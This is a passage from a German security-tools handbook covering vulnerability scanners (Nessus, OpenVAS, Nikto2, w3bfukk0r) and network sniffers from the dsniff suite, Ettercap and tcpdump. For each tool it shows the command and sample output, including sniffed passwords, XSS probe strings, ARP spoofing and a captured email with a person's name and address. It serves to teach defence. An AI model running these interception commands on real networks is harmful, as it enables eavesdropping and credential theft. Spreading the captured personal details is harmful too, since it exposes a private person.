kann. GUI-Clients sind f\u00fcr viele Plattformen verf\u00fcgbar, zudem l\u00e4sst sich Nessus \u00fcber einen Web-Browser steuern. Nach Beginn der Sitzung besteht die M\u00f6glichkeit, eine Vielzahl an Parametern zu definieren, etwa Ziele, Abh\u00e4ngigkeiten, Scanner und Plugins. Die Plugins, die regelm\u00e4\u00dfig erweitert und vom Hersteller heruntergeladen werden k\u00f6nnen, erm\u00f6glichen die Aufdeckung diverser Sicherheitsl\u00fccken der zu scannenden Hosts. Nessus speichert die Ergebnisse in einer Datenbank, ein Export in XML (.nessus), HTML und NBE (CVS) ist m\u00f6glich.\nBild 7.3: Der NessusServer-Manager unter Windows\n7.4 Open Vulnerability Assessment System / OpenVAS\n73\nBild 7.4: Nessus-Report als HTML-Datei\n7.4\nOpen Vulnerability Assessment System / OpenVAS\nAnbieter / Entwickler\nwww.openvas.org\nPreis\n-\nBetriebssystem(e)\nLinux, FreeBSD\nSprachen\nEnglisch\nKategorie(n)\nNetzwerkscanner / Vulnerability-Scanner\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 120 MB\nNein / Ja\nUsability\nInstallation / Kompilation\nKnow-how\nGUI\nSchnittstellen\nx\nCMD x\nAmap, Nmap, Portbunny, zahlreiche NASLSkripte, verinice\nOpenVAS ist ein freier Vulnerability-Scanner, der sich neben klassischen Verwundbarkeitsanalysen \u2013 einem holistischem Ansatz folgend \u2013 dem Schwachstellen-Management widmet. So bietet OpenVAS nicht nur eine umfassende Sammlung von Werkzeugen f\u00fcr die Sicherheitsanalyse in Netzwerken, sondern integriert zus\u00e4tzlich eine Vielzahl von weiteren Sicherheitsanwendungen. Neben der Verzahnung mit dem ISMS-Tool verinice ist OpenVAS durch die Funktion \u00bbLocal Access Credentials\u00ab in der Lage, auch Schwachstellen aus der Innensicht eines Scanziels zu erkunden. Dazu greift OpenVAS\n74\nKapitel 7 \u2013 Security-/Vulnerability-Scanner\nper SSH oder SMB auf das Zielsystem zu und pr\u00fcft Anwendungszust\u00e4nde, die von au\u00dfen nicht erkennbar sind, wie etwa den Patchlevel von Anwendungen oder die Komplexit\u00e4t der lokalen Kennw\u00f6rter. Das Herzst\u00fcck des \u00bbOpen Vulnerability Assessment System\u00ab bildet eine Serverkomponente, die eine Sammlung von Network Vulnerability Tests (NVT) nutzt, um Sicherheitsprobleme in Netzwerksystemen und -anwendungen aufzusp\u00fcren. Nach Beginn der Verwundbarkeitsanalyse besteht die M\u00f6glichkeit, eine Vielzahl von Parametern zu definieren, etwa Ziele, Abh\u00e4ngigkeiten, Scanner und Plugins. Die Plugins, die regelm\u00e4\u00dfig erweitert und sowohl von der Community als auch von kommerziellen Anbietern heruntergeladen werden k\u00f6nnen, erm\u00f6glichen die Aufdeckung diverser Sicherheitsl\u00fccken der zu scannenden Hosts. OpenVAS speichert die Ergebnisse in einer Datenbank, ein Export in PDF, HTML, XML, NBE ist m\u00f6glich.\nBild 7.5: Der OpenVAS-Client nebst Scanreports\n7.5 Nikto2\n75\nBild 7.6: Verlauf der Verwundbarkeitsanalyse durch OpenVAS\n7.5\nNikto2\nAnbieter\nhttp://www.cirt.net/nikto2\nPreis\n-\nBetriebssystem(e)\nPerl-Script: Linux/UNIX, Windows, BSD, Mac OS X\nSprachen\nEnglisch\nKategorie(n)\nWebserver / CGI-Scanner\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB Installation / Kompilation\nNein\nUsability\nKnow-how\nSchnittstellen\nCMD x Ben\u00f6tigt Perl und LibWhisker, SSL zum Scannen von HTTPS\nNikto ist ein auf der Programmiersprache Perl basierender Scanner f\u00fcr das Aufdecken von Schwachstellen auf Webservern und CGI-Scripten. Hierbei entdeckt Nikto auf der Suche nach Risiken u. a. Fehlkonfigurationen, unsichere Dateien, Scripts und \u00fcberalterte Software. Ein Start von Nikto2 mit den Parametern \u2022\n-host (target host)\nbringt folgendes Ergebnis (aus Gr\u00fcnden der \u00dcbersicht gek\u00fcrzt):\ndiscordia:~# ./nikto.pl -host www.victim.org - Nikto v2.1.0 --------------------------------------------------------------------------+ Target IP: 213.180.34.253 + Target Hostname: www.victim.org\n76\nKapitel 7 \u2013 Security-/Vulnerability-Scanner\n+ Target Port: 80 + Start Time: 2010-03-19 06:53:12 --------------------------------------------------------------------------+ Server: Apache/1.3.33 (Debian GNU/Linux) mod_ssl/2.8.22 OpenSSL/0.9.7e PHP/4.3.10-16 - Root page / redirects to: org-new/warez.php + OSVDB-0: robots.txt contains 12 entries which should be manually viewed. + OSVDB-27487: Apache is vulnerable to XSS via the Expect header + OSVDB-0: Apache/1.3.33 appears to be outdated (current is at least Apache/2.2.14). Apache 1.3.41 and 2.0.63 are also current. + OSVDB-0: mod_ssl/2.8.22 appears to be outdated (current is at least 2.8.31) (may depend on server version) + OSVDB-0: OpenSSL/0.9.7e appears to be outdated (current is at least 0.9.8i) (may depend on server version) + OSVDB-0: Number of sections in the version string differ from those in the database, the server reports: 4.3.10.45.16 while the database has: 5.2.8. This may cause false positives. + OSVDB-0: PHP/4.3.10-16 appears to be outdated (current is at least 5.2.8) + OSVDB-0: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST + OSVDB-32774: /phpinfo.php?VARIABLE=alert('Vulnerable'): Contains PHP configuration information and is vulnerable to Cross Site Scripting (XSS). + OSVDB-3233: /phpinfo.php: Contains PHP configuration information + OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests which contain specific QUERY strings. + OSVDB-3092: /shop/: This might be interesting... + OSVDB-3092: /stats/: This might be interesting... + OSVDB-20406: /phpinfo.php?GLOBALS[test]=alert(document.cookie);: PHP contains a flaw that allows a remote cross site scripting attack. + OSVDB-24484: /phpinfo.php?cx[]=V8JEpXtJUv8zuJ2qxhcF2bOGYbYOd343PBnhCOXJ8MQfc1hfs4mDZHgAk kE3cgQFSJBu1FNwSZnGEF2MlWbS6NEkPyejjmm0fRGK1s1CiP7MB1eWa8GtkgeEESrEoYlM9Ygt VwTW9i87VAiOoRPtTvVL1fR42W9uMTfOz83j5UQ6KxMItX00mC7JFkaKXRh6hRUwZ0cC8ZPSWSP luQEr20oFuGDaHALaoN (...) KWYjIFKOqRunREl7wZRPahfx1HsGcilmOsE6L5tPaU6zJoWH1crG8mqu18T5DranFpXcsC8mHPP rFa90ARjRecz6PLGzh1YLnoB38F6AIFqRZWlivaWmfrMe3Blcar1HriPcc2H4ks7YjMQDwGRSLo foXaOC3TUmq8cTpB6n29mWMe8rAgkCjK2Um7uguFfgMw4M6IbtMztbaf5wRBalert(f oo): PHP 5.1.2 and 4.4.2 phpinfo() Function Long Array XSS + 3588 items checked: 16 item(s) reported on remote host + End Time: 2010-03-19 06:01:44 (512 seconds) --------------------------------------------------------------------------+ 1 host(s) tested discordia:~#\nBild 7.7: Nikto beim Aufzeigen von Schwachstellen eines Webservers\n7.6 w3bfukk0r\n7.6\n77\nw3bfukk0r\nAnbieter / Entwickler\nhttp://ngolde.de/w3bfukk0r.html\nPreis\n-\nBetriebssystem(e) Linux/UNIX, Mac OS X\nSprachen\nEnglisch\nKategorie(n)\nForced Browsing Tool\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 2 MB\nNein / Ja\nUsability\nInstallation / Kompilation\nKnow-how\nGUI\nCMD x\nSchnittstellen\nw3bfukk0r ist ein Forced Browsing Tool und entdeckt durch einen W\u00f6rterbuchangriff getarnte Ressourcen auf Webservern, die eigentlich nicht referenziert werden. w3bfukk0r unterst\u00fctzt HTTP/HTTPS, Banner-Grabbing und die Tarnung des UserAgents. Eine Abfrage, angesetzt auf www.victim.org mit dem beiliegenden (und nat\u00fcrlich erweiterbaren) W\u00f6rterbuch: \u2022\n-f (specify wordlist file)\nbringt folgendes Ergebnis:\ndiscordia:~# ./w3bfukk0r -f words.txt http://www.victim.org Starting w3bfukk0r 0.2 Scanning http://www.victim.org/ with 101 words from words.txt Found http://www.victim.org/music/ (HTTP 200) Found http://www.victim.org/cgi-bin/ (not public; HTTP 403) Found 2 directories. Server runs: Apache/2.2.15 (Unix) Scan finished (2 seconds). discordia:~#\nBild 7.8: w3bfukk0r beim Enttarnen unreferenzierter Verzeichnisse eines Webservers\n7.7\nAbwehr \u2013 generelle Tipps\nDie beste Abwehr gegen Schwachstellenscanner ist der Einsatz derselben. In diesem Fall ist das Gift selbst das Antidot, d. h., um die Angriffspunkte von Hosts zu reduzieren, m\u00fcssen sie zuallererst detektiert werden, z. B. durch die oben genannten Tools. Hier bietet es sich insbesondere in Unternehmensnetzwerken an, auf regelm\u00e4\u00dfiger Basis \u2013 z. B. w\u00f6chentlich \u2013 alle schutzbed\u00fcrftigen Server nach Schwachstellen abzuklopfen, um so einem potenziellen Angreifer zuvorzukommen. Zudem l\u00e4sst sich \u00fcber dieses Vorge-\n78\nKapitel 7 \u2013 Security-/Vulnerability-Scanner\nhen wirkungsvoll \u00fcberpr\u00fcfen, ob Security Policies, z. B. aus dem Umfeld des PatchManagement oder Vorgaben zur Deaktivierung nicht ben\u00f6tigter Dienste, unternehmensweit eingehalten werden. Einen Einstieg in das Thema liefert die Ma\u00dfnahme \u00bb5.150 Durchf\u00fchrung von Penetrationstests\u00ab14 aus den IT-Grundschutz-Katalogen und auch die Studie Durchf\u00fchrungskonzept f\u00fcr Penetrationstests15 vom BSI16.\n14\nhttps://www.bsi.bund.de/cln_134/ContentBSI/grundschutz/kataloge/m/m05/m05150.html\n15\nhttps://www.bsi.bund.de/cae/servlet/contentblob/487300/publicationFile/30674/penetrationstest_pdf.pdf\n16\nhttp://www.bsi.de\n79\n8\nSniffer: Die Schn\u00fcffler im Netzwerk\nDas Wort \u00bbSniffer\u00ab gilt heute zwar als Gattungsbegriff f\u00fcr alle Tools, die Datenpakete innerhalb des Netzwerkverkehrs abgreifen und analysieren k\u00f6nnen, tats\u00e4chlich ist der Begriff ein gesetzlich gesch\u00fctztes Warenzeichen der Firma Network General. Auch f\u00fcr diese Werkzeuge gilt, dass es keine scharf umrissene Trennungslinie zwischen Netzwerkanalyse und Netzwerkspionage gibt. F\u00fcr Administratoren sind sie unverzichtbare Analysewerkzeuge, um Netzwerkst\u00f6rungen und -problemen, aber auch Einbruchsversuchen auf die Spur zu kommen. Auf der anderen Seite sind Sniffer hocheffiziente, im Einsatz kaum zu entdeckende Spionagetools. Grunds\u00e4tzlich kann jeder Rechner mit eingebauter Netzwerkkarte seine ein- und ausgehenden Daten analysieren. Um die Datenpakete anderer Netzrechner analysieren zu k\u00f6nnen, bedarf es eines technischen Tricks: Man muss die Karte in den Promiscuous Mode schalten. Wie der Name schon sagt, ist der Rechner jetzt in der Lage, alle Datenpakete (Frames), nicht nur die an ihn direkt adressierten, zu empfangen und auszuwerten. Begrenzt wird diese F\u00e4higkeit durch die Netzwerkstruktur. Sofern die Rechner \u00fcber Hubs miteinander verbunden sind, kann der gesamte Datenverkehr dieser Rechner mitgeschnitten werden. Sind die Rechner \u00fcber Switches vernetzt, die Datenpakete gezielt versenden, funktioniert dieser Trick nicht mehr. Um in geswitchten Netzwerken sniffen zu k\u00f6nnen, m\u00fcssen zus\u00e4tzliche Angriffstechniken eingesetzt werden, z. B. ARP-Spoofing (ARP Request Poisoning) oder MAC-Flooding. Das grunds\u00e4tzliche Problem beim Sniffen ist nicht die Technik, sondern das Datenaufkommen. Was an der Netzwerkkarte abgegriffen werden kann, sind Frames, d. h. Datenpakete, die f\u00fcr die \u00dcbertragung auf Layer 2 des OSI-Schichtenmodells kodiert sind und jede Menge Steuercodes, Headerinformationen usw. enthalten. Die Kunst des Sniffens h\u00e4ngt also entscheidend davon ab, wie gut sich aus diesen Datenpaketen die Nutzdaten (Logins, Passw\u00f6rter, Texte von E-Mail etc.) herausfiltern lassen. Gegen Sniffer ist kein wirkungsvolles Kraut gewachsen, au\u00dfer man setzt auf eine konsequente Verschl\u00fcsselung des gesamten Datenverkehrs. Mit anderen Worten: Das Herausfischen von interessanten Daten aus dem Netzwerkverkehr ist zwar aufwendig, aber f\u00fcr den Angreifer lohnend bei minimalem Risiko. Einziger Anhaltspunkt f\u00fcr den Verteidiger ist die Suche nach Netzwerkkarten, die sich im Promiscuous Mode befinden, oder der Einsatz von Anti-Spoofing-Technologien.\n80\nKapitel 8 \u2013 Sniffer: Die Schn\u00fcffler im Netzwerk\n8.1\ndsniff (dsniff-Suite)\nAnbieter\nwww.monkey.org/~dugsong/dsniff\nBetriebssystem(e) Linux/UNIX Kategorie(n) Gr\u00f6\u00dfe\nUsability\nSniffer (Passw\u00f6rter)\n< 2 MB Installation / Ja Kompilation\nPreis\n-\nSprachen\nEnglisch\nOberfl\u00e4che\nGUI\nCMD x\nSchnittstellen Ben\u00f6tigt BerkeleyDB, OpenSSL, libpcap, libnet und libnids Know-how\nDas dsniff-Paket beinhaltet eine Sammlung machtvoller Tools zur Netzwerkanalyse. Die passiven Programme dsniff, mailsnarf, msgsnarf, urlsnarf und webspy belauschen Netzwerkverkehr nach interessanten Daten (Passw\u00f6rtern, E-Mails, Dateien, etc.). Mit den Programmen arpspoof, dnsspoof und macof kann Netzwerkverkehr gef\u00e4lscht und kanalisiert werden. Die Programme sshmitm und webmitm erm\u00f6glichen Man-in-the-middleAttacken umgeleiteter SSH- und HTTPS-Verbindungen, tcpkill und tcpnice erm\u00f6glichen den Abbruch bzw. die Verlangsamung von Netzwerkverbindungen. Bei dsniff handelt es sich um einen Sniffer der dsniff-Suite, der die Kennw\u00f6rter folgender unverschl\u00fcsselter Protokolle automatisch aus dem Datenstrom abf\u00e4ngt: FTP, Telnet, SMTP, HTTP, POP, poppass, NNTP, IMAP, SNMP, LDAP, Rlogin, RIP, OSPF, PPTP MS-CHAP, NFS, VRRP, YP/NIS, SOCKS, X11, CVS, IRC, AIM, ICQ, Napster, PostgreSQL, Meeting Maker, Citrix ICA, Symantec pcAnywhere, NAI Sniffer, Microsoft SMB, Oracle SQL*Net, Sybase und Microsoft SQL-Protokoll. Der Einsatz von dsniff, gefunden an dem Netzwerkinterface eth0: \u2022\n-i interface (Specify the interface to listen on)\nbringt folgendes Ergebnis: discordia:~# dsniff -i eth0 dsniff: listening on eth0 ----------------09/27/09 16:05:26 tcp 192.168.1.200.32779 -> 192.168.1.50.23 (telnet) shellmaster paSSww00RD!shell ----------------09/27/09 17:25:54 tcp 192.168.1.190.3023 -> pop.kundenserver.de.110 (pop) USER 564565675 PASS 125125 ----------------09/27/09 18:05:23 tcp 192.168.1.190.4151 -> 192.168.1.100.5631 (pcanywhere) ll 1231234\n8.2 mailsnarf (dsniff-Suite)\n81\n----------------09/27/09 18:12:16 tcp 192.168.1.190.3013 -> ftpav.ca.com.21 (ftp) USER administrator PASS secretpass ----------------09/27/09 20:34:23 tcp 192.168.1.190.233 -> 192.168.1.1.80 (http) GET / HTTP/1.1 Host: 192.168.1.1 Authorization: Basic YWRtaW46YWRtaW4= [admin:admin] -----------------\n09/27/09 18:05:23 192.168.1.200:5900 -> 192.168.1.220:4087\nVNC\nUSER: On display :0 PASS: Server Challenge: 803ddab86c1d8fd69e1d094113ddb1cf Client 3DES: 6219eca12720ee27c7c3397de9f0222e ----------------09/27/09 18:05:23 192.168.1.200:4653 -> 192.168.1.10:139\nnetbios-ssn\nUSER: Administrator PASS: LC 2.5 FORMAT: \"USER\":3:3E8DB789C2AE3248:B93390C49E0BC96F00000000000000000000000000000000:7 7E6B8E556D85567167AFEA3A726D359664A441098CBBDE2\nBild 8.1: dsniff beim Mitschneiden diverser Verbindungen\n8.2\nmailsnarf (dsniff-Suite)\nAnbieter\nwww.monkey.org/~dugsong/dsniff\nBetriebssystem(e) Linux/UNIX Kategorie(n)\nSniffer (E-Mail)\nGr\u00f6\u00dfe\n< 2 MB\nUsability\nInstallation / Kompilation\nPreis\n-\nSprachen\nEnglisch\nOberfl\u00e4che GUI Ja\nSchnittstellen\nKnow-how\nCMD x\nBen\u00f6tigt BerkeleyDB, OpenSSL, libpcap, libnet und libnids\n82\nKapitel 8 \u2013 Sniffer: Die Schn\u00fcffler im Netzwerk\nDas Tool mailsnarf aus der dsniff-Suite speichert E-Mails, die aus POP- und SMTPTraffic herausgefiltert wurden, in ein klassisches Berkeley-mbox-Format. Die mboxDatei kann anschlie\u00dfend mit einem E-Mail-Programm (z. B. Mozilla Thunderbird oder Mutt) geladen und betrachtet werden. Der Einsatz von mailsnarf, gefunden an dem Netzwerkinterface eth0: \u2022\n-i interface (Specify the interface to listen on)\nbringt folgendes Ergebnis:\nroot@discordia:~# mailsnarf -i eth0 mailsnarf: listening on eth0 From\n[[email protected]](/cdn-cgi/l/email-protection)\nThu Feb 4 22:16:28 2010 Received: from 127.0.0.1 (AVG SMTP 9.0.733 [271.1.1/2667]); Thu, 04 Feb 2010 21:15:36 +0100 Message-ID:\n[[email protected]](/cdn-cgi/l/email-protection)\nDate: Thu, 04 Feb 2010 21:15:36 +0100 From:\n[[email protected]](/cdn-cgi/l/email-protection) [[email protected]](/cdn-cgi/l/email-protection)\nUser-Agent: Thunderbird 2.0.0.23 (Windows/20090812) MIME-Version: 1.0 To:\n[[email protected]](/cdn-cgi/l/email-protection)\nSubject: eBay-Rechnung vom Sonntag, 31. Januar 2010 Content-Type: text/plain; charset=windows-1252; format=flowed Content-Transfer-Encoding: 8bit\n-------------------------------------------------------------------------------------------------------------------eBay hat diese Mitteilung an Heiko Langer (etcpasswd) gesendet. Ihr Vor- und Nachname in dieser Mitteilung sind ein Hinweis darauf, dass die Nachricht tats\u00e4chlich von eBay stammt. Mehr zum Thema: http://pages.ebay.de/help/confidence/name-useridemails.html --------------------------------------------------------------------------------------------------------------------\n8.3 urlsnarf (dsniff-Suite)\n83\n***Dies ist eine automatisch generierte E-Mail. Bitte antworten Sie nicht darauf.*** Rechnungsnummer:\n013499-172583110033\nHeiko Langer Roonstra\u00dfe 10 49078 Osnabrueck Deutschland\nHallo Langer Heiko (etcpasswd), Ihre monatliche Rechnung von eBay f\u00fcr den Zeitraum von 01. Januar 2010 bis 31. Januar 2010 steht jetzt zur Ansicht online bereit.\nF\u00e4lliger Betrag:\n31,18\nSie haben als automatische Zahlungsmethode das Lastschriftverfahren gew\u00e4hlt. Der Rechnungsbetrag wird innerhalb der n\u00e4chsten 5 bis 7 Tage (...)\nBild 8.2: Das Programm mailsnarf beim Mitschneiden transferierter E-Mails\n8.3\nurlsnarf (dsniff-Suite)\nAnbieter\nwww.monkey.org/~dugsong Preis /dsniff\n-\nBetriebssystem(e)\nLinux/UNIX\nSprachen\nEnglisch\nKategorie(n)\nSniffer (URLs)\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nJa Schnittstellen Ben\u00f6tigt BerkeleyDB, OpenSSL, libpcap, libnet und libnids\nUsability\nInstallation / Kompilation\nKnow-how\nCMD\nx\nDas Tool urlsnarf aus der dsniff-Suite erzeugt eine CLF-Datei (Common Log Format) des mitgeschnittenen HTTP-Traffics eines Netzwerks. Die CLF-Datei kann im Anschluss mit einem dazu geeigneten Programm zur Analyse von Web-Logfiles untersucht werden. Der Einsatz von urlsnarf, gefunden an dem Netzwerkinterface eth0: \u2022\n-i interface (Specify the interface to listen on)\nbringt folgendes Ergebnis:\n84\nKapitel 8 \u2013 Sniffer: Die Schn\u00fcffler im Netzwerk\nroot@discordia:~# urlsnarf -i eth0 192.168.1.217 \u2013 - [04/Feb/2010:11:50:03 +0100] \"GET http://avgtechnologies.112.2o7.net/b/ss/avgcorporatepublicww/1/H.17/s896381 35944740?AQB=1&ndh=1&t=4/1/2010%2020%3A49%3A39%204%20-60&ce=UTF8&ns=avgtechnologies&pageName=http%3A//static.avg.com/programupdate/de.perform-program-update.html&g=http%3A//static.avg.com/programupdate/de.perform-programupdate.html&server=static.avg.com&events=event23&c6=DE&v6=DE&c8=DEDE&c14=DE&c15=DE-DE&v22=http%3A//static.avg.com/program-update/de.performprogram-update.html&v23=DE&c24=Direct%20Load&v24=DE-DE&v30=popupcampaign_perform-programupdate_de&s=1024x768&c=32&j=1.5&v=Y&k=Y&bw=604&bh=347&ct=lan&hp=N&AQE=1 HTTP/1.1\" \u2013 - \"http://static.avg.com/program-update/de.perform-programupdate.html\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" 192.168.1.229 \u2013 - [04/Feb/2010:11:50:08 +0100] \"GET http://intranet.discordiawerke.de/ HTTP/1.1\" \u2013 - \"-\" \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.1)\" 192.168.1.10 \u2013 - [04/Feb/2010:11:50:13 +0100] \"GET http://www.heise.de/ HTTP/1.1\" \u2013 - \"-\" \" Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" 192.168.1.10 \u2013 - [04/Feb/2010:11:50:13 +0100] \"GET http://www.heise.de/newsticker/foren/S-Regiert-sein-das-heisst/forum141674/msg-15333344/read/ HTTP/1.1\" \u2013 - \"-\" \" Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" ^C root@discordia:~#\nBild 8.3: Das Tool urlsnarf beim Mitschneiden von Webverbindungen\n8.4\narpspoof (dsniff-Suite)\nAnbieter\nwww.monkey.org/~dugsong/ dsniff\nBetriebssystem(e) Linux/UNIX Kategorie(n)\nNetzwerktool (Arpspoofing)\nGr\u00f6\u00dfe\n< 2 MB\nUsability\nInstallation / Kompilation\nJa\nPreis\n-\nSprachen\nEnglisch\nOberfl\u00e4che\nGUI\nSchnittstellen\nKnow-how\nCMD x\nBen\u00f6tigt BerkeleyDB, OpenSSL, libpcap, libnet und libnids\nDas Tool arpspoof aus der dsniff-Suite erm\u00f6glicht durch die Technik des \u00bbArpspoofings\u00ab die gezielte Umleitung des Netzwerkverkehrs. \u00dcblicherweise wird hierzu der Netzwerkverkehr zum lokalen Gateway \u00fcber den Rechner des Angreifers geleitet, der daraufhin\n8.5 PHoss\n85\ns\u00e4mtliche Netzwerkpakete z. B. mit einem separat zu startenden Sniffer wie dsniff oder Ettercap NG durchleuchten kann. Der Einsatz von arpspoof, gefunden an dem Netzwerkinterface eth0: \u2022\n-i interface (Specify the interface to listen on)\n\u2022\n-t target\nbringt folgendes Ergebnis: root@discordia:~# arpspoof -i eth0 -t 192.168.1.10 192.168.1.1 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce 0:21:86:58:f0:ce (...)\n0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at 0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at 0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at 0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at 0:17:31:78:81:c7 0806 42: arp reply 192.168.1.1 is-at\nBild 8.4: arpspoof beim Spoofing eines Netzwerks\n8.5\nPHoss\nAnbieter\nwww.phenoelitus.org/fr/tools.html\nPreis\n-\nBetriebssystem(e)\nLinux/UNIX\nSprachen\nEnglisch\nKategorie(n)\nSniffer (Passw\u00f6rter)\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nNein / Schnittstellen Ja\nUsability\nInstallation / Kompilation\nKnow-how\nCMD x\nPHoss ist ein Sniffer von Phenoelit, der die Kennw\u00f6rter zu den Login-Sessions von HTTP, FTP, LDAP, Telnet, IMAP4, POP3 und VNC-Password-Challenges aufgreift. Der Einsatz von PHoss, gefunden an dem Netzwerkinterface eth0: \u2022\n-i (use this interface)\nbringt folgendes Ergebnis:\n86\nKapitel 8 \u2013 Sniffer: Die Schn\u00fcffler im Netzwerk\ndiscordia:~# Phoss -i eth0 PHoss (Phenoelit's own security sniffer) (c) 1999 by Phenoelit (http://www.phenoelit.de) $Revision: 1.13 $ >>>>>>>>>>>>>>>>>>>>>>>>>>>>> Source: 192.168.1.101:2705 Destination: 194.25.134.93:110 Protocol: POP3 Data: 054174835:999888 >>>>>>>>>>>>>>>>>>>>>>>>>>>>> Source: 192.168.1.101:2774 Destination: 212.227.15.183:110 Protocol: POP3 Data: m8465732-5:9675843 >>>>>>>>>>>>>>>>>>>>>>>>>>>>> Source: 192.168.1.101:2705 Destination: 194.25.134.93:110 Protocol: POP3 Data: 054174835:999888 >>>>>>>>>>>>>>>>>>>>>>>>>>>>> Source: 192.168.1.101:2774 Destination: 212.227.15.183:110 Protocol: POP3 Data: m8465732-5:9675843 Goodbye\nBild 8.5: PHoss beim Mitschneiden von POP3-Verbindungen\n8.6\nDriftnet\nAnbieter\nhttp://www.exparrot.com/~chris/driftnet\nBetriebssystem(e) Linux/UNIX\nPreis Sprachen\nKategorie(n)\nSniffer (JPEG/GIF-Grafiken) Oberfl\u00e4che\nGr\u00f6\u00dfe\n< 2 MB\nUsability\nInstallation / Kompilation\nEnglisch GUI\nNein / Schnittstellen Ja Know-how\nCMD\nx\nDriftnet erfasst JPEG- und GIF-Grafiken aus dem Netzwerktraffic und stellt diese in einem X-Window dar. Die Grafiken, die in wie in einer Slideshow abgespielt werden, lassen sich zudem auf der Festplatte abspeichern. Der Einsatz von driftnet mag ein Ergebnis liefern wie folgt: root@discordia:~# driftnet\n8.7 Ettercap / Ettercap NG\n87\nBild 8.6: Driftnet bei einer Slideshow der besonderen Art\n8.7\nEttercap / Ettercap NG\nAnbieter\nhttp://ettercap.sourceforge.net\nPreis\n-\nBetriebssystem(e) Linux/UNIX, FreeBSD, OpenBSD, NetBSD, Mac OS X, Windows, Solaris\nSprachen\nEnglisch\nKategorie(n)\nSniffer (z. B. Passw\u00f6rter)\nOberfl\u00e4che\nGr\u00f6\u00dfe\n< 10 MB\nNein / Ja\nUsability\nInstallation / Kompilation\nKnow-how\nGUI\nx\nCMD x\nSchnittstellen Ben\u00f6tigt zlib, libpcap, libnet und libpthread. Vielf\u00e4ltige Plugins\nEttercap ist ein m\u00e4chtiger Sniffer, z. B. f\u00fcr Man-in-the-middle-Attacken in einem LAN. Ettercap kann Echtzeitverbindungen (Live-Connections) inklusive Login-Daten mitschneiden, relevante Inhalte filtern und verf\u00fcgt \u00fcber erweiterbare Plugins und vieles mehr. Ettercap unterst\u00fctzt die aktive und passive Analyse vieler Protokolle und versteht sich in vielf\u00e4ltiger Weise auf die Netzwerk- und Hostanalyse. Zu dem kommandozeilenbasierten Tool gibt es ein GUI auf NCurses-Basis und ein grafisches GTK-GUI. Der Aufruf von Ettercap f\u00fcr das Ncurses-Interface und \u2022\n-C, --curses (use curses GUI)\nbringt u. a. folgendes Ergebnis: discordia:~# ettercap \u2013C\n88\nKapitel 8 \u2013 Sniffer: Die Schn\u00fcffler im Netzwerk\nBild 8.7: Ettercap mit NCurses-GUI\n8.8\ntcpdump\nAnbieter\nwww.tcpdump.org\nPreis\n-\nBetriebssystem(e)\nLinux/UNIX, Windows (WinDump)\nSprachen\nEnglisch\nKategorie(n)\nNetzwerkverkehr-Analyseprogramm\nOberfl\u00e4che\nGUI\nGr\u00f6\u00dfe\n< 2 MB\nNein/ Schnittstellen Ja\nUsability\nInstallation / Kompilation\nKnow-how\nCMD x WinDump ben\u00f6tigt die WinPcap-Library\nTcpdump liest Daten in Form von Paketen, die \u00fcber das Netzwerk gesendet werden, und dient als leistungsf\u00e4hige Sniffing-Software zur Auswertung von Netzwerkverkehr. Tcpdump erm\u00f6glicht die \u00dcberwachung der Kommunikation zwischen verschiedenen Teilnehmern eines Netzwerks. Der Einsatz von tcpdump, gefunden an dem Netzwerkinterface eth0: \u2022\n-i interface\nbringt folgendes Ergebnis (aus \u00dcbersichtszwecken leicht gek\u00fcrzt):\n8.9 Wireshark\n89\ndiscordia:~# tcpdump \u2013i eth0 20:57:56.797548 172.16.3.24 > igrp-routers.mcast.net: ip-proto-88 40 [tos 0xc0] 20:57:56.798277 0:50:4:a4:84:b > Broadcast sap e0 ui/C >>> Unknown IPX Data: (67 bytes) [000] FF FF 00 50 00 14 00 00 00 00 FF FF FF FF FF FF ...P.... ........ [010] 04 55 00 00 00 00 00 50 04 A4 84 0B 04 55 00 01 .U.....P .....U.. [020] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ........ ........ [030] 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 ........ ........ [040] 53 41 50 SAP len=67 20:57:56.799413 0:d0:b7:a:a0:11 > Broadcast sap e0 ui/C >>> Unknown IPX Data: (67 bytes) [000] FF [010] 04 [020] 00 [030] 00 [040] 53 len=67 (...)\nFF 55 00 00 56\n00 04 00 00 31\n50 95 00 00\n00 41 00 00\n14 A0 00 00\n00 00 00 00\n00 D0 00 00\n00 B7 00 00\n20:57:57.314992 0:30:5:38:d2:fd > >>> Unknown IPX Data: (79 bytes) [000] FF FF 00 60 00 04 04 95 41 [010] 04 52 04 95 41 A0 00 30 05 [020] 06 40 4F 53 50 43 31 32 36 [030] 00 00 00 00 00 00 00 00 00\n00 0A 00 00\nFF A0 00 00\nFF 11 00 00\nFF 04 00 00\nFF 55 00 00\nFF 00 00 00\nFF 01 00 01\n...P.... .U..A... ........ ........ SV1\n........ .....U.. ........ ........\n...'.... .R..A..0 .@MSPC12 ........\nA....... .8..@... 61...... ........\nBroadcast sap e0 ui/C A0 38 31 00\nFF D2 00 00\nFF FD 00 00\nFF 40 00 00\nFF 08 00 00\nFF 00 00 00\nFF 02 00 00\nBild 8.8: Tcpdump beim Mitlesen von 